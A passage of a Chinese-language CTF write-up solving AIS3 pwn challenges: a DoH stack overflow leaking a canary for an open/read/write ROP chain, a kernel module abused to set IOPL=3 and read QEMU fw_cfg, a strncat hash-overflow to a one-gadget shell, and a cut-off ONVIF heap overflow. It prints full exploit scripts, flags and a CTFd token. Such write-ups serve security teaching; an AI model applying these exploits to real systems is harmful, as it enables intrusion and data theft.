##### 第一階段：Leak Canary
送出 invalid `type`：
```python
payload = b"B" * 56
```

伺服器回傳 `bad_type` hex string 後，將其轉成 bytes：
```python
raw = bytes.fromhex(leaked_hex)

canary = raw[56:64]
saved_rbp = raw[64:72]
saved_ret = raw[72:80]
```

其中：
- `canary` 用來繞過 stack protector。
- `saved_rbp` 原樣放回 payload，避免破壞 stack frame。
- `saved_ret` 可用來確認 leak 的位置正確。

##### 第二階段：ROP
Payload layout：
```text
[ padding 56 bytes ]
[ leaked canary 8 bytes ]
[ saved rbp 8 bytes ]
[ ROP chain ]
```

因為 binary 沒有 PIE，所以 ROP gadget 位址固定。
使用的 gadgets：
```python
pop_rdi = 0x69a383
pop_rsi = 0x46958e
pop_rdx = 0x4d5513
pop_rax = 0x694ed4
syscall = 0x711d26
mov_edi_eax = 0x6bd710
```

使用 `.bss` 作為暫存空間：
```python
bss = 0x8f8000
```

ROP chain 目標：
1. `read(socket_fd, bss, 0x20)`
2. `open(bss, 0, 0)`
3. `mov edi, eax`
4. `read(flag_fd, bss + 0x100, 0x100)`
5. `write(socket_fd, bss + 0x100, 0x100)`

其中 `socket_fd` 在此環境中為 `4`。

##### Exploit
```python
#!/usr/bin/env python3
import socket
import re
import struct
import time

HOST = "chals1.ais3.org"
PORT = 57573

p64 = lambda x: struct.pack("<Q", x)

pop_rdi = 0x69a383
pop_rsi = 0x46958e
pop_rdx = 0x4d5513
pop_rax = 0x694ed4
syscall = 0x711d26
mov_edi_eax = 0x6bd710

bss = 0x8f8000
sock_fd = 4


def build_request(type_bytes: bytes) -> bytes:
    encoded = "".join("%%%02x" % b for b in type_bytes)

    request = (
        f"GET /dns-query?name=www.curious.sleeping.&type={encoded} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )

    return request.encode()


def leak_stack():
    payload = b"B" * 56

    s = socket.create_connection((HOST, PORT), timeout=5)
    s.sendall(build_request(payload))

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk

    s.close()

    m = re.search(rb'"bad_type":"([0-9a-f]+)"', data)
    if not m:
        raise RuntimeError("failed to leak stack")

    raw = bytes.fromhex(m.group(1).decode())

    canary = raw[56:64]
    saved_rbp = raw[64:72]
    saved_ret = raw[72:80]

    print("[+] canary    =", canary.hex())
    print("[+] saved rbp =", saved_rbp.hex())
    print("[+] saved ret =", hex(struct.unpack("<Q", saved_ret)[0]))

    return canary, saved_rbp


def exploit():
    canary, saved_rbp = leak_stack()

    rop = b""

    # read(sock_fd, bss, 0x20)
    rop += p64(pop_rax) + p64(0)
    rop += p64(pop_rdi) + p64(sock_fd)
    rop += p64(pop_rsi) + p64(bss)
    rop += p64(pop_rdx) + p64(0x20)
    rop += p64(syscall)

    # open(bss, 0, 0)
    rop += p64(pop_rax) + p64(2)
    rop += p64(pop_rdi) + p64(bss)
    rop += p64(pop_rsi) + p64(0)
    rop += p64(pop_rdx) + p64(0)
    rop += p64(syscall)

    # edi = eax, use open() return value as fd
    rop += p64(mov_edi_eax)

    # read(flag_fd, bss + 0x100, 0x100)
    rop += p64(pop_rax) + p64(0)
    rop += p64(pop_rsi) + p64(bss + 0x100)
    rop += p64(pop_rdx) + p64(0x100)
    rop += p64(syscall)

    # write(sock_fd, bss + 0x100, 0x100)
    rop += p64(pop_rax) + p64(1)
    rop += p64(pop_rdi) + p64(sock_fd)
    rop += p64(pop_rsi) + p64(bss + 0x100)
    rop += p64(pop_rdx) + p64(0x100)
    rop += p64(syscall)

    payload = b"A" * 56
    payload += canary
    payload += saved_rbp
    payload += rop

    s = socket.create_connection((HOST, PORT), timeout=5)

    # Trigger stack overflow through type=
    s.sendall(build_request(payload))

    # Wait until ROP reaches read(sock_fd, bss, 0x20)
    time.sleep(0.3)

    # Send filename for open()
    s.sendall(b"/flag.txt\x00")

    s.settimeout(3)
    out = b""

    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass

    s.close()

    print(out.decode("latin1", errors="replace"))


if __name__ == "__main__":
    exploit()
```

##### Exploit 流程
1. 啟動 instancer，讓 `chals1.ais3.org:57573` 開始接受連線。
2. 發送非法 `type=` 查詢，例如 `B * 56`。
3. 從錯誤回應的 `bad_type` 欄位取得 stack leak。
4. 將 hex leak 轉成 bytes。
5. 從固定 offset 取出 stack canary。
6. 同時取出 saved RBP，並確認 saved return address。
7. 因為 binary 沒有 PIE，直接使用固定 ROP gadget 位址。
8. 使用 percent-encoding 將 raw bytes payload 放進 `type=`。
9. Payload 結構為 padding、canary、saved RBP、ROP chain。
10. ROP 先呼叫 `read()`，從同一條 socket 讀入 `/flag.txt\x00` 到 `.bss`。
11. ROP 呼叫 `open("/flag.txt", 0, 0)`。
12. 使用 `mov edi, eax; ret` 將 `open()` 回傳的 fd 放到 `rdi`。
13. ROP 呼叫 `read(flag_fd, bss + 0x100, 0x100)` 讀取 flag。
14. ROP 呼叫 `write(socket_fd, bss + 0x100, 0x100)` 將 flag 回傳給攻擊者。
15. 成功取得 flag。

##### 執行結果
```text
[+] canary    = 003a6a70507b13f7
[+] saved rbp = 30b5b883fd7f0000
[+] saved ret = 0x4095e4
AIS3{B4d_bAd_64d_D0H_p4r(rr)rs3r[rr]r_:(((_QQ}
```


### 獨屬於你的魔法
#### 題目敘述
題目是一題 kernel pwn。遠端 instancer 會啟動一個 QEMU VM，並將我們上傳的 exploit 作為磁碟掛進 VM。

run.sh 啟動方式如下：
```sh
qemu-system-x86_64 \
    -kernel bzImage \
    -initrd initramfs.cpio \
    -cpu qemu64,+smap,+smep \
    -smp 2 \
    -m 256M \
    -append "console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on nokaslr noapic" \
    -no-reboot \
    -nographic \
    -monitor /dev/null \
    -drive file=$1,format=raw,index=0,media=disk
```

可以注意到：
- SMEP 開啟
- SMAP 開啟
- KPTI 開啟：pti=on
- KASLR 關閉：nokaslr
- exploit 會被當成 /dev/sda 掛進去

initramfs 裡的 /init：
```
cp /dev/sda /tmp/e
chmod +x /tmp/e
chmod 600 flag.txt
insmod /driver/wand.ko
setsid cttyhack setuidgid 1000 /bin/sh
```

也就是說，使用者 shell 是 uid 1000，不能直接讀 `flag.txt`。
題目提供了一個 kernel module：`wand.ko`，並附上原始碼 `wand.c`。
#### 漏洞說明
核心漏洞在 `/driver/wand.c`。
重點程式碼如下：
```c
#define WAND_MAGIC 'a'
struct iret_frame {
    __u64 rip;
    __u64 cs;
    __u64 rflags;
    __u64 rsp;
    __u64 ss;
};
#define WAND_CAST _IOW(WAND_MAGIC, 0, struct iret_frame)
#define SWAPGS_RESTORE_ADDR 0xffffffff820015d0UL
#define OFF_RIP    128
#define OFF_CS     136
#define OFF_RFLAGS 144
#define OFF_RSP    152
#define OFF_SS     160
#define CORE_SIZE  168
static u8 magic_core[CORE_SIZE] __aligned(8);
static atomic_t spell_cast = ATOMIC_INIT(0);
static unsigned long swapgs_restore_addr;
static long wand_ioctl(struct file *f, unsigned int cmd, unsigned long uarg)
{
    if (cmd != WAND_CAST)
        return -EINVAL;
    if (atomic_xchg(&spell_cast, 1))
        return -EPERM;
    struct iret_frame fr;
    if (copy_from_user(&fr, (void __user *)uarg, sizeof(fr)))
        return -EFAULT;
    memset(magic_core, 0, sizeof(magic_core));
    *((__u64 *)(magic_core + OFF_RIP))    = fr.rip;
    *((__u64 *)(magic_core + OFF_CS))     = fr.cs;
    *((__u64 *)(magic_core + OFF_RFLAGS)) = fr.rflags;
    *((__u64 *)(magic_core + OFF_RSP))    = fr.rsp;
    *((__u64 *)(magic_core + OFF_SS))     = fr.ss;
    void *pivot = magic_core;
    unsigned long tramp = swapgs_restore_addr;
    asm volatile(
        "mov %0, %%rsp\n\t"
        "jmp *%1\n\t"
        :: "r"(pivot), "r"(tramp) : "memory"
    );
    __builtin_unreachable();
}
/dev/wand 是 world-writable：
static struct miscdevice wand_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = "wand",
    .fops  = &wand_fops,
    .mode  = 0666,
};
```

所以非 root 使用者可以呼叫 ioctl。
#### 這個 module 做了什麼？
它讓使用者傳入一個假的 `iret_frame`：
```c
struct iret_frame {
    uint64_t rip;
    uint64_t cs;
    uint64_t rflags;
    uint64_t rsp;
    uint64_t ss;
};
```

接著 module 會把 kernel stack pivot 到 `magic_core`：
```
mov magic_core, rsp
jmp 0xffffffff820015d0
```

`0xffffffff820015d0` 是 kernel 裡的 `swapgs_restore_regs_and_return_to_usermode` 附近的 trampoline。
這段 trampoline 會從 stack 上 pop 一堆暫存器，最後執行 `iretq` 回到 userspace。
因為 `magic_core` 的 layout 是：
```
offset 0x00 ~ 0x7f : zero padding
offset 0x80        : rip
offset 0x88        : cs
offset 0x90        : rflags
offset 0x98        : rsp
offset 0xa0        : ss
```

剛好對上 kernel return-to-userspace trampoline 最後期待的 iret frame。
所以我們可以控制：
```
RIP
CS
RFLAGS
RSP
SS
```

並讓 kernel 執行一次 `iretq` 回到我們指定的 userspace function。
#### 為什麼不是傳統 kernel ROP？
一開始可能會想做：
`commit_creds(prepare_kernel_cred(0))`

但這題其實沒有給我們一般 kernel ROP 所需的控制權。
原因是：
1. `magic_core` 前面大部分都是 0
2. module 直接跳進 kernel 的 return-to-user trampoline
3. 我們只能控制最後的 iret frame
4. 在 `iretq` 前沒有可控的 kernel RIP gadget chain

因此沒辦法直接在 kernel mode 跑 ROP chain。

真正的利用點在於：
`iretq` 是由 CPL0 執行的，因此它可以恢復使用者提供的 `RFLAGS`，包含一般 userspace 不能自己設定的 IOPL bits。
#### 漏洞說明
x86 的 `RFLAGS` 裡有 IOPL 欄位：
`bit 12-13: IOPL`

一般 user mode 不允許自己把 IOPL 設成 3。
但這裡 kernel 幫我們執行 `iretq`，而 iret frame 的 `rflags` 是我們控制的。
所以我們可以設定：
``rflags = 0x3202;``

其中：
```
0x2000 | 0x1000 = IOPL=3
0x200             = IF
0x2               = reserved bit
```

也就是：
`RFLAGS = IF | IOPL=3 | fixed bit`

回到 userspace 後，雖然我們仍然是 uid 1000，但是 CPU 允許我們在 ring3 執行 I/O port 指令：
```
inb
outw
```

這就是題目提示的「magic」。
#### 利用 QEMU fw_cfg 讀 initrd
QEMU 提供一個叫 `fw_cfg` 的介面，可以透過 I/O port 存取一些 firmware 資料。
x86 上常見 port：
```
#define FW_CFG_SEL  0x510
#define FW_CFG_DATA 0x511
```

透過：
```
outw(0x510, selector);
inb(0x511);
```

可以讀 QEMU 提供的資料。
這題 QEMU 是用：
```
-kernel bzImage
-initrd initramfs.cpio
```

啟動，因此 initrd 內容可以透過 fw_cfg 讀出。
相關 selector：
```c
#define FW_CFG_SIGNATURE   0x00
#define FW_CFG_INITRD_SIZE 0x0b
#define FW_CFG_INITRD_DATA 0x12
```

利用步驟：
5. 呼叫 /dev/wand ioctl
6. 讓 kernel iretq 回 userspace
7. 在 rflags 裡設定 IOPL=3
8. 回到 userspace 後用 inb/outw 讀 QEMU fw_cfg
9. 從 fw_cfg 讀出 initramfs
10. 在 initramfs bytes 裡搜尋 AIS3{...}

這樣就不需要 root，也不需要讀 /flag.txt，因為我們直接從 QEMU 提供的 initrd 原始資料中把 flag 抽出來。
#### Exploit
完整 exploit 如下：
```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#define WAND_MAGIC 'a'
#define WAND_CAST _IOW(WAND_MAGIC, 0, struct iret_frame)
#define FW_CFG_SEL  0x510
#define FW_CFG_DATA 0x511
#define FW_CFG_SIGNATURE   0x00
#define FW_CFG_INITRD_SIZE 0x0b
#define FW_CFG_INITRD_DATA 0x12
struct iret_frame {
    uint64_t rip;
    uint64_t cs;
    uint64_t rflags;
    uint64_t rsp;
    uint64_t ss;
};
static uint8_t dump[32 * 1024 * 1024];
static uint8_t stage2_stack[0x4000] __attribute__((aligned(16)));
static inline void outw_p(uint16_t port, uint16_t val) {
    asm volatile ("outw %0, %1" :: "a"(val), "Nd"(port));
}
static inline uint8_t inb_p(uint16_t port) {
    uint8_t val;
    asm volatile ("inb %1, %0" : "=a"(val) : "Nd"(port));
    return val;
}
static void fw_select(uint16_t key) {
    outw_p(FW_CFG_SEL, key);
}
static uint32_t read_size_candidate(int be) {
    uint8_t b[4];
    fw_select(FW_CFG_INITRD_SIZE);
    for (int i = 0; i < 4; i++) {
        b[i] = inb_p(FW_CFG_DATA);
    }
    if (be) {
        return ((uint32_t)b[0] << 24)
             | ((uint32_t)b[1] << 16)
             | ((uint32_t)b[2] << 8)
             | b[3];
    }
    return ((uint32_t)b[3] << 24)
         | ((uint32_t)b[2] << 16)
         | ((uint32_t)b[1] << 8)
         | b[0];
}
static void print_flag_from(const uint8_t *buf, size_t n) {
    for (size_t i = 0; i + 5 < n; i++) {
        if (memcmp(buf + i, "AIS3{", 5) == 0) {
            size_t j = i;
            while (j < n && j - i < 256) {
                char c = buf[j++];
                write(1, &c, 1);
                if (c == '}') {
                    write(1, "\n", 1);
                    _exit(0);
                }
            }
        }
    }
}
static void stage2(void) {
    char sig[5] = {0};
    fw_select(FW_CFG_SIGNATURE);
    for (int i = 0; i < 4; i++) {
        sig[i] = (char)inb_p(FW_CFG_DATA);
    }
    write(1, "fw=", 3);
    write(1, sig, 4);
    write(1, "\n", 1);
    uint32_t sz_be = read_size_candidate(1);
    uint32_t sz_le = read_size_candidate(0);
    size_t n = sz_be;
    if (n == 0 || n > sizeof(dump)) {
        n = sz_le;
    }
    if (n == 0 || n > sizeof(dump)) {
        n = sizeof(dump);
    }
    fw_select(FW_CFG_INITRD_DATA);
    for (size_t i = 0; i < n; i++) {
        dump[i] = inb_p(FW_CFG_DATA);
    }
    print_flag_from(dump, n);
    write(1, "flag not found\n", 15);
    _exit(1);
}
int main(void) {
    int fd = open("/dev/wand", O_RDONLY);
    if (fd < 0) {
        perror("open /dev/wand");
        return 1;
    }
    struct iret_frame fr;
    memset(&fr, 0, sizeof(fr));
    fr.rip = (uint64_t)stage2;
    fr.cs = 0x33;
    fr.rflags = 0x3202;
    fr.rsp = (uint64_t)(stage2_stack + sizeof(stage2_stack) - 0x10);
    fr.ss = 0x2b;
    ioctl(fd, WAND_CAST, &fr);
    perror("ioctl");
    return 1;
}
```

編譯：
`gcc -static -O2 -Wall -Wextra -o e exploit.c`

上傳到 instancer 後，VM 裡會把它放在：
`/tmp/e`

執行：
`/tmp/e`
#### Exploit
1. 打開 `/dev/wand`
	`int fd = open("/dev/wand", O_RDONLY);`
	`wand` 是 misc device，權限是 `0666`，所以 uid 1000 可以直接開。

2. 準備 fake iret frame
	```
	fr.rip = (uint64_t)stage2;
	fr.cs = 0x33;
	fr.rflags = 0x3202;
	fr.rsp = (uint64_t)(stage2_stack + sizeof(stage2_stack) - 0x10);
	fr.ss = 0x2b;
	```

	這裡：
	```
	rip    = 回 userspace 後執行的函式
	cs     = user code segment
	ss     = user stack segment
	rsp    = user stack
	rflags = IOPL=3
	```
	`cs=0x33`、`ss=0x2b` 是一般 x86_64 Linux userspace segment selector。

3. 觸發 ioctl
	`ioctl(fd, WAND_CAST, &fr);`

	module 會：
	```
	copy_from_user()
	填入 magic_core
	rsp = magic_core
	jmp swapgs_restore_regs_and_return_to_usermode
	iretq
	```

	最後回到：
	`stage2();`

4. userspace 使用 I/O port
	因為 `RFLAGS.IOPL=3`，所以現在 userspace 可以做：
	```python
	outw_p(0x510, selector);
	inb_p(0x511);
	```

	先測試 QEMU signature：
	```python
	fw_select(FW_CFG_SIGNATURE);
	for (int i = 0; i < 4; i++) {
	    sig[i] = inb_p(FW_CFG_DATA);
	}
	```

	輸出會是：
	`fw=QEMU`

	代表 port I/O 成功。

5. 讀 initrd 並搜尋 flag
	```python
	fw_select(FW_CFG_INITRD_DATA);
	for (size_t i = 0; i < n; i++) {
	    dump[i] = inb_p(FW_CFG_DATA);
	}
	```

	讀出 initrd 後直接搜尋：
	`memcmp(buf + i, "AIS3{", 5)`

	找到 `}` 後輸出完整 flag。

#### Flag：
```
AIS3{The_true_magic_is_in_the_journey_of_finding_it@I_believe_you_found_your_own_magic_on_your_own!}
```
#### 解法
這題的重點不是傳統的 kernel ROP，也不是找 Linux 0day。
`wand.ko` 給了我們一個特殊 primitive：
controlled iret frame
雖然不能直接在 kernel mode 執行 ROP，但可以控制 `RFLAGS`。利用 kernel-mode `iretq` 幫我們恢復 `IOPL=3`，就能在 ring3 執行 I/O port 指令。
接著透過 QEMU 的 `fw_cfg` port 讀出 initrd，從原始 initramfs 裡搜尋 flag，即可繞過 `/flag.txt` 的檔案權限限制。

### blooockchain
#### 題目敘述
題目提供一個簡單的「區塊鏈交易紀錄系統」，使用者可以透過選單新增交易、查看 ledger，或離開程式。

程式功能大致如下：
1. Add transaction record to ledger
2. View ledger
3. Exit cryptocurrency exchange

使用者新增一筆交易時，需要輸入：
```
From account
To account
Money amount
```

三個欄位都只能是小寫 hex 字元，也就是 `0-9a-f`。
程式會把交易格式化成：
`From: <from>, To: <to>, Money: <money>`

接著使用 shell command 呼叫 `sha256sum` 計算 hash：
`echo -n "%s" | sha256sum`

最後把 SHA-256 digest 寫進 stack 上的 ledger buffer。

#### 關鍵觀察
```
RELRO:    Full RELRO
Canary:   No canary
NX:       Enabled
PIE:      Enabled
```

雖然有 Full RELRO、NX、PIE，但沒有 stack canary。
重點符號：
```
blockchain  0x13bb
main        0x1849
```

#### 漏洞說明
核心漏洞在 `blockchain()` 裡面的 ledger 儲存方式。
程式在 stack 上配置一個 0x200 bytes 的 buffer：
`char ledger[0x200];`
每次新增交易時，程式會計算交易的 SHA-256 digest，然後把 raw digest append 到 ledger：
```python
strncat(ledger, hex, 0x20);
counter++;
```

第一，hex 其實不是 hex string，而是 SHA-256 raw bytes。SHA-256 digest 長度是 32 bytes，內容可能包含 `\x00`。
第二，程式使用 `strncat` append raw bytes。`strncat` 會把來源當成 C string，因此遇到 `\x00` 就停止。

這導致：
counter 會增加
但 ledger 實際長度不一定增加
如果我們找到一筆交易，使得 SHA-256 digest 第一個 byte 是 `\x00`，那麼：
`strncat(ledger, digest, 0x20);`

實際上不會 append 任何資料，但 counter 還是會增加。
查看 ledger 時，程式不是根據字串長度輸出，而是根據 `counter * 32` 輸出：
```python
for (i = 0; i < counter * 32; i++) {
    printf("%02x", ledger[i]);
}
```

因此可以造成 out-of-bounds read，從 stack 上 leak 出 PIE、libc、stack address 等資訊。

#### 漏洞利用思路
整體 exploit 分成幾個步驟：
4. 找到 SHA-256 digest 開頭為 `\x00` 的交易。
5. 重複送入這種交易，增加 `counter` 但不增加 ledger 長度。
6. 使用 View ledger leak stack。
7. 從 stack leak 中取得 PIE base 和 libc base。
8. 利用可控 SHA-256 digest 覆寫 saved RBP 與 saved RIP。
9. 先跳回 `blockchain()` 作為 trampoline，調整 stack 狀態。
10. 再跳到 libc one-gadget，取得 shell。
11. 讀取 `/flag.txt`。

#### Stack Leak
因為可以讓 `counter` 增加但 ledger 不增加，所以 View ledger 會印出 ledger 後面的 stack 資料。
實際 leak 中可以觀察到：
```
offset 0x208: PIE return address
offset 0x218: libc return address
```

PIE base：
`pie_base = u64(leak[0x208:0x210]) - 0x185b`

libc base：
`libc_base = u64(leak[0x218:0x220]) - 0x2a578`

這裡要注意：一開始我誤判 libc leak offset 為 `0x2f578`，但遠端實際對應 provided libc 的 `0x2a578`。修正後 exploit 才成功。

#### RIP Overwrite
ledger buffer 大小是 `0x200`。如果我們正常 append 16 筆沒有 `\x00` 的 SHA-256 digest：
`16 * 32 = 512 = 0x200`

剛好填滿 stack buffer。
接下來再 append digest，就會覆寫 saved RBP 和 saved RIP。
但是因為使用 `strncat`，來源 digest 裡如果出現 `\x00` 就會停止，所以不能直接放完整 ROP chain。
因此我們使用「prefix brute force」：
找到一筆交易，使得它的 SHA-256 digest 開頭是我們想要的 2 bytes，且後面一個 byte 是 `\x00`：
`digest = desired_2_bytes + \x00 + ...`

這樣每次可以穩定寫入 2 bytes。
用這個方法分段寫入：
```
saved RBP: 8 bytes
saved RIP: 6 bytes
```

saved RIP 只需要 6 bytes，因為 x86-64 userland address 高位通常是 canonical address，可以用 partial overwrite。
#### 為什麼需要 trampoline
直接跳 one-gadget 失敗，原因是 one-gadget 對 register 和 stack layout 有限制。
成功使用的 gadget 是 provided libc 中的：
`libc + 0x11b7ef`

one_gadget 顯示：
```
0x11b7ef posix_spawn(rdi, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], ...} is a valid argv
  [r9] == NULL || r9 == NULL || r9 is a valid envp
  rdi == NULL || writable: rdi
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

直接跳時 stack 上的 `[rsp+0x70]` 不是 NULL，導致條件不滿足。
解法是先把 RIP 覆寫回：
`PIE + 0x13c0`

這是 `blockchain()` prologue 附近：
```
push rbp
mov rbp, rsp
sub rsp, 0x200
```

重新進入 blockchain() 後，stack frame 會被 shift，下一次返回時 one-gadget 的 stack constraint 剛好滿足。
因此 exploit 流程是：
```
第一次 overwrite RIP -> blockchain+0x13c0
第二次 overwrite RIP -> libc+0x11b7ef
```

成功後拿到 shell。
#### Exploit
以下是簡化後的 exploit 核心版本：
```python
#!/usr/bin/env python3
import hashlib
import json
import os
import re
import socket
import struct
import subprocess
import time
from datetime import datetime, timezone
HOST = "chals1.ais3.org"
PORT = 21337
TOKEN = b"ctfd_f657000486562756c103265e701cbd3f11ffd972f5842974dfe4b346d08781c7"
CACHE = "prefix_cache.json"
def p64(x):
    return struct.pack("<Q", x)
def u64(x):
    return struct.unpack("<Q", x.ljust(8, b"\x00"))[0]
def digest_for(tx):
    f, t, m = tx
    msg = f"From: {f}, To: {t}, Money: {m}".encode()
    return hashlib.sha256(msg).digest()
def load_cache():
    if not os.path.exists(CACHE):
        return {}
    with open(CACHE, "r") as f:
        return json.load(f)
def save_cache(cache):
    with open(CACHE, "w") as f:
        json.dump(cache, f)
def find_prefix(prefix, require_next_zero=True):
    cache = load_cache()
    key = json.dumps((prefix.hex(), require_next_zero))
    if key in cache:
        tx = tuple(cache[key])
        d = digest_for(tx)
        if d.startswith(prefix):
            if not require_next_zero or d[len(prefix)] == 0:
                return tx
    i = 0
    while True:
        tx = ("a", "b", hex(i)[2:] or "0")
        d = digest_for(tx)
        if d.startswith(prefix):
            if not require_next_zero or d[len(prefix)] == 0:
                cache[key] = list(tx)
                save_cache(cache)
                return tx
        i += 1
def find_null_tx():
    return find_prefix(b"", True)
def find_full_hash_tx():
    i = 0
    while True:
        tx = ("c", "d", hex(i)[2:] or "0")
        if b"\x00" not in digest_for(tx):
            return tx
        i += 1
class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port))
        self.buf = b""
    def send(self, data):
        self.s.sendall(data)
    def recv(self):
        return self.s.recv(4096)
    def readuntil(self, marker):
        while marker not in self.buf:
            chunk = self.recv()
            if not chunk:
                raise EOFError(self.buf)
            self.buf += chunk
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out
    def readsome(self):
        self.s.settimeout(0.2)
        try:
            return self.s.recv(4096)
        except Exception:
            return b""
        finally:
            self.s.settimeout(None)
def leading_zero_bits(digest):
    total = 0
    for b in digest:
        if b == 0:
            total += 8
            continue
        for shift in range(7, -1, -1):
            if b & (1 << shift):
                return total
            total += 1
    return total
def solve_pow(bits, resource):
    date = datetime.now(timezone.utc).strftime("%y%m%d%H%M%S")
    counter = 0
    while True:
        stamp = f"1:{bits}:{date}:{resource}::python:{counter:x}"
        h = hashlib.sha1(stamp.encode()).digest()
        if leading_zero_bits(h) >= bits:
            return stamp
        counter += 1
def start_instance():
    io = Tube(HOST, PORT)
    io.readuntil(b"ctfd token> ")
    io.send(TOKEN + b"\n")
    banner = io.readuntil(b"stamp> ")
    m = re.search(rb"pow_solver.py (\d+) '([^']+)'", banner)
    bits = int(m.group(1))
    resource = m.group(2).decode()
    stamp = solve_pow(bits, resource)
    io.send(stamp.encode() + b"\n")
    menu = io.readuntil(b"choice> ")
    io.send(b"1\n")
    data = b""
    while b"Connect to: nc localhost" not in data:
        data += io.recv()
    m = re.search(rb"Connect to: nc localhost (\d+)", data)
    return int(m.group(1))
def add_tx(io, tx, wait=True):
    f, t, m = tx
    if wait:
        io.readuntil(b"Enter your choice: ")
    io.send(b"1\n")
    io.readuntil(b"Enter From account: ")
    io.send(f.encode() + b"\n")
    io.readuntil(b"Enter To account: ")
    io.send(t.encode() + b"\n")
    io.readuntil(b"Enter Money amount: ")
    io.send(m.encode() + b"\n")
def view(io):
    io.readuntil(b"Enter your choice: ")
    io.send(b"2\n")
    data = io.readuntil(b"Enter your choice: ")
    text = data.decode(errors="ignore")
    body = text.split("Chain status:\n", 1)[1]
    body = body.split("1. Add transaction", 1)[0]
    hx = "".join(re.findall(r"[0-9a-f]{2}", body))
    return bytes.fromhex(hx)
def overwrite(io, addr, wait):
    filler = find_full_hash_tx()
    for _ in range(16):
        add_tx(io, filler, wait)
        wait = True
    payload = b"A" * 8 + p64(addr)[:6]
    if b"\x00" in payload:
        raise RuntimeError("payload contains NULL")
    for i in range(0, len(payload), 2):
        chunk = payload[i:i+2]
        tx = find_prefix(chunk, True)
        add_tx(io, tx, wait)
        wait = True
    io.readuntil(b"Enter your choice: ")
    io.send(b"3\n")
def main():
    port = start_instance()
    io = Tube(HOST, port)
    # Step 1: leak stack
    null_tx = find_null_tx()
    for _ in range(40):
        add_tx(io, null_tx)
    leak = view(io)
    pie_base = u64(leak[0x208:0x210]) - 0x185b
    libc_base = u64(leak[0x218:0x220]) - 0x2a578
    print("[+] PIE base :", hex(pie_base))
    print("[+] libc base:", hex(libc_base))
    # Step 2: first overwrite, return to blockchain trampoline
    overwrite(io, pie_base + 0x13c0, wait=False)
    # Wait for new blockchain menu
    io.readuntil(b"Enter your choice: ")
    # Step 3: second overwrite, jump to one_gadget
    overwrite(io, libc_base + 0x11b7ef, wait=False)
    time.sleep(0.3)
    # Step 4: read flag
    io.send(b"cat /flag.txt\n")
    out = b""
    for _ in range(30):
        out += io.readsome()
        time.sleep(0.1)
    print(out.decode(errors="replace"))
if __name__ == "__main__":
    main()
```

#### Flag
```
AIS3{51Mpl3_8LoCKch@1n_N0t_S1mPl3_PWN}
```

### ooonvifd
#### 題目敘述
題目提供一個模擬 ONVIF IP-camera 的服務 binary：`onvifd`。
服務啟動後會 listen 在 TCP port 8080，實作一個簡化版 HTTP/SOAP ONVIF endpoint。支援的 SOAP operation 包含：
- `GetSystemDateAndTime`
- `GetDeviceInformation`
- `GetCapabilities`
- `GetScopes`
- `UploadFirmware`
#### 保護機制
```
Full RELRO
Canary found
NX enabled
PIE enabled
FORTIFY enabled
SHSTK enabled
IBT enabled
Not stripped
```

基本上常見保護全開，因此不能簡單 ret2libc 或 GOT overwrite。最後利用方向是：
1. 洩漏 libc base
2. 利用 heap overflow 做 tcache poisoning
3. overwrite `__free_hook`
4. 觸發 `system("cat /f* >&4")`
#### 關鍵觀察
服務主要流程如下：
5. `main()` accept 一個 TCP connection。
6. 分配一個 request context。
7. 呼叫 `parse_http()` 解析 HTTP request line / headers。
8. 如果是一般 SOAP body，讀取 Content-Length bytes 後呼叫 `dispatch_soap()`。
9. 如果 `Content-Type` 是 `multipart/related`，會進入 `parse_mime()` 處理 MTOM attachment。
10. 根據 SOAP operation 呼叫 handler，例如 `handle_upload_firmware()`。
11. request 結束後釋放 MIME parts 與 context。

重要 symbol：
```
main                   0x13a0
soap_malloc            0x1a40
soap_dealloc           0x19d0
handle_upload_firmware 0x1ce0
dispatch_soap          0x1d90
parse_http             0x22a0
parse_mime             0x27a0
```

#### 漏洞說明
`handle_get_capabilities()` 會使用 `Host`: header 產生 SOAP response。
`Host` 會被放進一個 stack buffer 中，再透過 `snprintf()` 組 response。
問題在於：
```python
len = snprintf(buf, 0x500, template, host, host, ...);
send(fd, buf, len, 0);
```

`snprintf()` 的回傳值是「如果 buffer 足夠時，理論上會輸出的長度」，而不是實際寫進 `buf` 的長度。
因此如果 `Host` 很長，`snprintf()` 會截斷寫入，但回傳值仍然大於 `0x500`。後續 `send()` 使用這個過大的長度，就會把 stack 上 `buf` 後面的資料一起送出。

利用方式：
```python
body = b'<s:Envelope><s:Body><tds:GetCapabilities/></s:Body></s:Envelope>'
host = b'C' * 240
req = (
    b'POST / HTTP/1.1\r\n'
    b'Host: ' + host + b'\r\n'
    b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
    b'\r\n' + body
)
```

從 response 固定 offset 可拿到 libc return address：
```
leak = u64(resp[1544:1552])
libc_base = leak - 0x24083
```

遠端是 Ubuntu 20.04 glibc 2.31，正確 offsets：
```
__libc_start_main_ret = 0x24083
system                 = 0x52290
__free_hook            = 0x1eee48
```

#### 漏洞說明
`parse_mime()` 會解析 multipart body。每個 MIME part 的 body 初始配置：
```
body = malloc(0x200);
capacity = 0x200;
length = 0;
```

正常讀取 body byte 時，程式會檢查容量，不夠就 `realloc()`。
但是當 parser 看到：`\r\n--`
它會認為可能遇到 MIME boundary，開始把後面的 bytes 暫存到 stack buffer 中，並比對是否等於 boundary。
如果比對失敗，程式會把這段 false boundary candidate flush 回 body buffer。
問題是：flush 回 body buffer 時沒有逐 byte 檢查 capacity。
因此可以構造：
```
<0x1ff bytes body>
\r\n--
<fake boundary prefix>
<mismatch byte>
```

此時 body 長度接近 `0x200`，false-boundary flush 會越界寫到下一個 heap chunk。
本地 gdb 驗證後可得知 overflow layout：
```
body chunk usable area:
  rbp + 0x000 ... rbp + 0x1ff
overflow bytes start:
